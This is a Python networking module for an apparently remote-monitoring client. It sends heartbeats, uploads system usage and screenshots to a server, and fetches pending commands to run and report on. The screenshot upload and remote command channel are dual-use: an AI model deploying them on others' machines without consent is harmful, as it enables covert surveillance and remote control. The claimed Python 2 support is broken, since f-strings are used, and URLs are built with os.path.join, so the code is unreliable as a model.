# 网络通信模块

import os
import sys
import json
import time
from io import BytesIO
from .logger import logger
from .config import API_BASE, PY2

# 兼容Python 2.7和3.x
if PY2:
    import urllib2
    import urllib
    from httplib import HTTPConnection, HTTPSConnection
else:
    import urllib.request as urllib2
    import urllib.parse as urllib
    from http.client import HTTPConnection, HTTPSConnection

class Network:
    """网络通信类"""
    
    @staticmethod
    def _make_request(url, method='GET', data=None, files=None, headers=None):
        """发送HTTP请求"""
        try:
            if method == 'GET':
                if data:
                    url = f"{url}?{urllib.urlencode(data)}" if not PY2 else f"{url}?{urllib.urlencode(data)}"
                request = urllib2.Request(url)
            else:
                if files:
                    # 处理文件上传
                    boundary = '---------------------------' + str(int(time.time() * 1000))
                    content_type = f'multipart/form-data; boundary={boundary}'
                    
                    body = BytesIO()
                    
                    # 添加普通字段
                    if data:
                        for key, value in data.items():
                            body.write(f'--{boundary}\r\n'.encode('utf-8'))
                            body.write(f'Content-Disposition: form-data; name="{key}"\r\n\r\n'.encode('utf-8'))
                            body.write(f'{value}\r\n'.encode('utf-8'))
                    
                    # 添加文件字段
                    for key, file_data in files.items():
                        body.write(f'--{boundary}\r\n'.encode('utf-8'))
                        body.write(f'Content-Disposition: form-data; name="{key}"; filename="screenshot.jpg"\r\n'.encode('utf-8'))
                        body.write(b'Content-Type: image/jpeg\r\n\r\n')
                        body.write(file_data)
                        body.write(b'\r\n')
                    
                    # 结束边界
                    body.write(f'--{boundary}--\r\n'.encode('utf-8'))
                    
                    request = urllib2.Request(url, body.getvalue())
                    request.add_header('Content-Type', content_type)
                    request.add_header('Content-Length', str(len(body.getvalue())))
                else:
                    # 普通POST请求
                    if data:
                        if PY2:
                            post_data = urllib.urlencode(data)
                        else:
                            post_data = urllib.urlencode(data).encode('utf-8')
                    else:
                        post_data = None
                    
                    request = urllib2.Request(url, post_data)
                    request.add_header('Content-Type', 'application/x-www-form-urlencoded')
            
            # 添加自定义头部
            if headers:
                for key, value in headers.items():
                    request.add_header(key, value)
            
            # 发送请求
            response = urllib2.urlopen(request, timeout=30)
            response_data = response.read()
            
            # 解析响应
            if PY2:
                return json.loads(response_data)
            else:
                return json.loads(response_data.decode('utf-8'))
        
        except urllib2.HTTPError as e:
            logger.error('HTTP错误: %s %s', e.code, e.reason)
            if e.code == 404:
                logger.error('请求的URL不存在: %s', url)
            return None
        except urllib2.URLError as e:
            logger.error('URL错误: %s', e.reason)
            return None
        except json.JSONDecodeError as e:
            logger.error('JSON解析错误: %s', e)
            return None
        except Exception as e:
            logger.error('请求失败: %s', e)
            return None
    
    @staticmethod
    def send_heartbeat(hostname, ip_address, port):
        """发送心跳"""
        url = os.path.join(API_BASE, 'heartbeat')
        data = {
            'hostname': hostname,
            'ip_address': ip_address,
            'port': port
        }
        
        response = Network._make_request(url, method='POST', data=data)
        if response and response.get('status') == 'ok':
            client_id = response.get('client_id')
            logger.debug('心跳发送成功，客户端ID: %s', client_id)
            return client_id
        else:
            logger.error('心跳发送失败')
            return None
    
    @staticmethod
    def upload_system_data(client_id, cpu_usage, memory_usage, disk_usage):
        """上传系统数据"""
        url = os.path.join(API_BASE, 'system_data')
        data = {
            'client_id': client_id,
            'cpu_usage': cpu_usage,
            'memory_usage': memory_usage,
            'disk_usage': disk_usage
        }
        
        response = Network._make_request(url, method='POST', data=data)
        if response and response.get('status') == 'ok':
            logger.debug('系统数据上传成功')
            return True
        else:
            logger.error('系统数据上传失败')
            return False
    
    @staticmethod
    def upload_screenshot(client_id, screenshot_data):
        """上传截图"""
        url = os.path.join(API_BASE, 'screenshots')
        data = {'client_id': client_id}
        files = {'file': screenshot_data}
        
        response = Network._make_request(url, method='POST', data=data, files=files)
        if response and response.get('status') == 'ok':
            logger.debug('截图上传成功')
            return True
        else:
            logger.error('截图上传失败')
            return False
    
    @staticmethod
    def get_pending_commands(client_id):
        """获取待执行命令"""
        url = os.path.join(API_BASE, f'commands/pending/{client_id}')
        
        response = Network._make_request(url, method='GET')
        if response and response.get('status') == 'ok':
            commands = response.get('commands', [])
            logger.debug('获取到%d条待执行命令', len(commands))
            return commands
        else:
            logger.error('获取待执行命令失败')
            return []
    
    @staticmethod
    def update_command_result(command_id, status, result=''):
        """更新命令执行结果"""
        url = os.path.join(API_BASE, f'commands/result/{command_id}')
        data = {
            'status': status,
            'result': result
        }
        
        response = Network._make_request(url, method='POST', data=data)
        if response and response.get('status') == 'ok':
            logger.debug('命令执行结果更新成功')
            return True
        else:
            logger.error('命令执行结果更新失败')
            return False
    
    @staticmethod
    def get_preset_commands():
        """获取预设命令"""
        url = os.path.join(API_BASE, 'preset_commands')
        
        response = Network._make_request(url, method='GET')
        if response and response.get('status') == 'ok':
            return response.get('preset_commands', [])
        else:
            logger.error('获取预设命令失败')
            return []

# 测试代码
if __name__ == '__main__':
    # 测试心跳
    network = Network()
    client_id = network.send_heartbeat('test-host', '127.0.0.1', 5000)
    logger.info('测试心跳结果: client_id=%s', client_id)
